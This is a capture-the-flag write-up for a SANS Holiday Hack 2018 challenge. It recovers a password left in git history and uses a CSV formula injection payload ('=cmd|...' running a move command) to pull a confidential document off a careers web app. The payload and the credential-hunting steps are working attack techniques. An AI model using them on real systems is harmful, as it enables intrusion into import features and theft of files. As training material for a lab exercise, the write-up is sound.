# SANS HOLIDAY HACK CHALLENGE - 2018 - QUESTION 7

```
https://holidayhackchallenge.com/2018/story.html
```

### DESCRIPTION

Santa uses an Elf Resources website to look for talented information security professionals. Gain access to the website and fetch the document C:\candidate_evaluation.docx. Which terrorist organization is secretly supported by the job applicant whose name begins with "K"? For hints on achieving this objective, please visit Sparkle Redberry and help her with the Dev Ops Fail Cranberry Pi terminal challenge.

### CRANBERRY PI CHALLENGE

<img src='elf.jpg' width=500px>

```
<Sparkle>

Hi, I'm Sparkle Redberry!

Ugh, can you believe that Elf Resources is poking around? Something about sensitive info in my git repo.

I mean, I may have uploaded something sensitive earlier, but it's no big deal. I overwrote it!

Care to check my Cranberry Pi terminal and prove me right?

</Sparkle>
```

##### DEV OPS FAIL

```
                                                                         
                                                                          
                                   .0.                                    
                               .:llOXKllc.                                
                                 .OXXXK,                                  
                                 '0l'cOc                                  
                                 ..';'..                                  
                               .';::::::'.                                
                            .':::::::::::::,.                             
                         .'::loc::::::::::::::,.                          
                      .'::::oMMNc::::::::::::::::,.                       
                    .,;;,,,,:dxl:::::::,,,:::;,,,,,,.                     
                    .,'  ..;:::::::::::;,;::::,.                          
                      .';::::::::::::::::::::dOxc,.                       
                   .';:::::::::okd::::::::::cXMWd:::,.                    
                .';:::::::::::cNMMo:::::::::::lc:::::::,.                 
             .'::::::::::::::::col::::::::::::;:::::::::::,.              
                   .;:::,,,:::::::::::::::::;,,,:::::'.                   
                .'::::::;;;:::::::::::dko:::::;::::::::;.                 
             .,::::::::::::::::::::::lWMWc::::::::::::::::;.              
            ..:00:...;::::loc:::::::::coc::::::::::::'.;;.....            
              :NNl.,:::::xMMX:::::::::::::::::::::::::;,,.                
               .,::::::::cxxl::::,,,:::::::::::::::::::::;.               
            .,:::::::c:::::::::::;;;:::::::;;:::::kNXd::::::;.            
         .,::::::::cKMNo::::::::::::::::::;,,;::::xKKo:::::::::;.         
       .'''''',:::::x0Oc:::::::::oOOo:::::::::::::::::::::;'''''''.       
            .,:::::::::::::::::::kWWk::::::::::::::ldl:::::;'.            
         .,::;,,::::::::::::::::::::::::::::::::::lMMMl:::::::;'.         
      .,:::::;,;:::::::::::::::::::::::::::::::::::ldl::::::::::::'.      
   .,::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::'.   
                               ..;;;;;;;;'.                               
                             .';;;;;;;;;;;;'.                             
                          .';;;;;;;;;;;;;;;;;;'.                          
                         ........................                         


Coalbox again, and I've got one more ask.
Sparkle Q. Redberry has fumbled a task.
Git pull and merging, she did all the day;
With all this gitting, some creds got away.
Urging - I scolded, "Don't put creds in git!"
She said, "Don't worry - you're having a fit.
If I did drop them then surely I could,
Upload some new code done up as one should."
Though I would like to believe this here elf,
I'm worried we've put some creds on a shelf.
Any who's curious might find our "oops,"
Please find it fast before some other snoops!
Find Sparkle's password, then run the runtoanswer tool.
```

###### ELF HINT

```
Finding Passwords in GIT

https://en.internetwache.org/dont-publicly-expose-git-or-how-we-downloaded-your-websites-sourcecode-an-analysis-of-alexas-1m-28-07-2015/
```

```
GIT Cheat Sheet

https://gist.github.com/hofmannsven/6814451
```

###### CRANBERRY PI ENUMERATION

```
elf@27b1b2c5f0f7:~$ pwd
/home/elf
elf@27b1b2c5f0f7:~$ ls
kcconfmgmt  runtoanswer
elf@27b1b2c5f0f7:~$ ls kcconfmgmt/
README.md  app.js  package-lock.json  package.json  public  routes  server  views
elf@27b1b2c5f0f7:~/kcconfmgmt$ git log 
commit 7b93f4be7e7b50b044739e02fa7c75b8fad32366
Author: Sparkle Redberry <sredberry@kringlecon.com>
Date:   Wed Nov 14 04:46:12 2018 -0500
    Add palceholder index, login, profile, signup pages while I CONTINUE TO WAIT FOR UX
commit 20c7def24307589194b7dc05cd852552c36b2b2a
Author: Sparkle Redberry <sredberry@kringlecon.com>
Date:   Tue Nov 13 10:18:08 2018 -0500
    Add Bower setup for front-end
commit 604e434713b4659d7f10b91ab6d20dfa58030c24
Author: Sparkle Redberry <sredberry@kringlecon.com>
Date:   Mon Nov 12 13:04:08 2018 -0500
    Add temp placeholders for login, profile, signup pages -- WAITING ON YOU UX TEAM
commit 31f4eaec30df0f41fc700532d7bc2f6aac94deb8
Author: Sparkle Redberry <sredberry@kringlecon.com>
Date:   Mon Nov 12 00:51:23 2018 -0500
    Add routes for login, logout, signup, isLoggedIn, profile access
commit ac32750bf6a4979bf37108f4438bc9695189ce14
Author: Sparkle Redberry <sredberry@kringlecon.com>
Date:   Sun Nov 11 15:30:15 2018 -0500
    Update index route for passport
commit d84b728c7d9cf7f9bafc5efb9978cd0e3122283d
Author: Sparkle Redberry <sredberry@kringlecon.com>
Date:   Sat Nov 10 19:51:52 2018 -0500
    Add user model for authentication, bcrypt password storage
commit c27135005753f6dde3511a7e70eb27f92f67393f
Author: Sparkle Redberry <sredberry@kringlecon.com>
Date:   Sat Nov 10 08:11:40 2018 -0500
    Add passport config
commit a6449287cf9ed9151d94fb747f6904158c2c4d71
Author: Sparkle Redberry <sredberry@kringlecon.com>
Date:   Fri Nov 9 14:08:04 2018 -0500
    Add passport middleware for user auth
commit 60a2ffea7520ee980a5fc60177ff4d0633f2516b
Author: Sparkle Redberry <sredberry@kringlecon.com>
Date:   Thu Nov 8 21:11:03 2018 -0500
    Per @tcoalbox admonishment, removed username/password from config.js, default settings i
n config.js.def need to be updated before use
commit b2376f4a93ca1889ba7d947c2d14be9a5d138802
Author: Sparkle Redberry <sredberry@kringlecon.com>
Date:   Thu Nov 8 13:25:32 2018 -0500
    Add passport module
commit d99d465d5b9711d51d7b455584af2b417688c267
Author: Sparkle Redberry <sredberry@kringlecon.com>
Date:   Wed Nov 7 16:57:41 2018 -0500
    Correct typos, runs now! Change port for MongoDB connection
ommit 68405b8a6dcaed07c20927cee1fb6d6c59b62cc3
Author: Sparkle Redberry <sredberry@kringlecon.com>
Date:   Tue Nov 6 17:26:39 2018 -0500
    Add initial server config
commit 69cc84998e57f4fc6aca17f2a5cb9caff53f3fd3
Author: Sparkle Redberry <sredberry@kringlecon.com>
Date:   Mon Nov 5 20:17:51 2018 -0500
    Added speakers.js data model
commit c3ee078d17a5309fbe18426c048a9a12b495f39f
Author: Sparkle Redberry <sredberry@kringlecon.com>
Date:   Mon Nov 5 01:27:11 2018 -0500
    File reorganization under server/
commit b4d783d7a7f8ba9bb3aee72aeba43ba9bb99c8b0
Author: Sparkle Redberry <sredberry@kringlecon.com>
Date:   Sun Nov 4 04:30:39 2018 -0500
    Module cleanup
commit 9c06c0441c95323e8270f6a219439daba59017f5
Author: Sparkle Redberry <sredberry@kringlecon.com>
Date:   Fri Nov 2 11:05:49 2018 -0400
    Added Express EJS setup (go away, Jade)
commit 1f9bbf6d2cee75a9dd6bb483edf940f9bb71035f
Author: Sparkle Redberry <sredberry@kringlecon.com>
Date:   Thu Nov 1 11:30:50 2018 -0400
    Initial checkin
```

The commit comment "Per @tcoalbox admonishment, removed username/password from
config.js, default settings in config.js.def need to be updated before use" is
what we're looking for..

```
elf@cd179561997b:~/kcconfmgmt$ git diff b2376f4a93ca1889ba7d947c2d14be9a5d138802 60a2ffea752
0ee980a5fc60177ff4d0633f2516b
diff --git a/server/config/config.js b/server/config/config.js
deleted file mode 100644
index 25be269..0000000
--- a/server/config/config.js
+++ /dev/null
@@ -1,4 +0,0 @@
-// Database URL
-module.exports = {
-    'url' : 'mongodb://sredberry:twinkletwinkletwinkle@127.0.0.1:27017/node-api'
-};
diff --git a/server/config/config.js.def b/server/config/config.js.def
new file mode 100644
index 0000000..740eba5
--- /dev/null
+++ b/server/config/config.js.def
@@ -0,0 +1,4 @@
+// Database URL
+module.exports = {
+    'url' : 'mongodb://username:password@127.0.0.1:27017/node-api'
+};
```

Our `git diff` of the two commits shows "sredberry:twinkletwinkletwinkle" was
removed.

```
elf@cd179561997b:~$ ./runtoanswer 
Loading, please wait......
Enter Sparkle Redberry's password: twinkletwinkletwinkle
This ain't "I told you so" time, but it's true:
I shake my head at the goofs we go through.
Everyone knows that the gits aren't the place;
Store your credentials in some safer space.
Congratulations!
```

```
<Sparkle>

Oh my golly gracious - Tangle was right? It was still in there? How embarrassing!

Well, if I can try to redeem myself a bit, let me tell you about another challenge you can help us with.

I wonder if Tangle Coalbox has taken a good look at his own employee import system.

It takes CSV files as imports. That certainly can expedite a process, but there's danger to be had.

I'll bet, with the right malicious input, some naughty actor could exploit a vulnerability there.

I'm sure the danger can be mitigated. OWASP has guidance on what not to allow with such oploads.

</Sparkle>
```

###### MORE ELF HINTS

```
CSV Injection Talk

Somehow Brian Hostetler is giving a talk on CSV injection WHILE he's giving a talk on Trufflehog. Whatta' guy!
```

```
OWASP on CSV Injection

https://www.owasp.org/index.php/CSV_Injection
```

### SOLUTION

```
Elf InfoSec Careers

https://careers.kringlecastle.com/
```

<img src='elf-infosec-site.jpg' width=500px>

The webapp allows us to upload a `CSV` document which we can insert
a payload in it. My guess is that we can create a command injection
that moves the file `C:\candidate_evaluation.docx` to the webroot
of the server so that we can download it.

Enumerating on the website, we trigger a 404 error that leaks
important information.

<img src='elf-infosec-site-404.jpg' width=500px>

The error message leaks the file system location we need to move
the `candidate_evaluation.docx` file to! Crafting a `.csv` payload
something like this to try..

```
$ cat resume-payload.csv
workplace, job description, =cmd|’ /C move C:\candidate_evaluation.docx C:\careerportal\resources\public’!’A1′
```

And then trying to fetch the file..

```
$ wget https://careers.kringlecastle.com/public/candidate_evaluation.docx
--2018-12-27 00:30:53--  https://careers.kringlecastle.com/public/candidate_evaluation.docx
Resolving careers.kringlecastle.com (careers.kringlecastle.com)... 35.229.118.54
Connecting to careers.kringlecastle.com (careers.kringlecastle.com)|35.229.118.54|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3912 (3.8K) [text/html]
Saving to: ‘candidate_evaluation.docx.2’

candidate_evalua 100%[==========>]   3.82K  --.-KB/s    in 0s

2018-12-27 00:30:53 (138 MB/s) - ‘candidate_evaluation.docx.2’ saved [3912/3912]
```

<img src='candidate_evaluation-pg1.jpg' width=500px>
<img src='candidate_evaluation-pg2.jpg' width=500px>

So it seems the elf in question is "Krampus" and he is affiliated
with the organization "Fancy Beaver".

<img src='answer.jpg' width=500px>

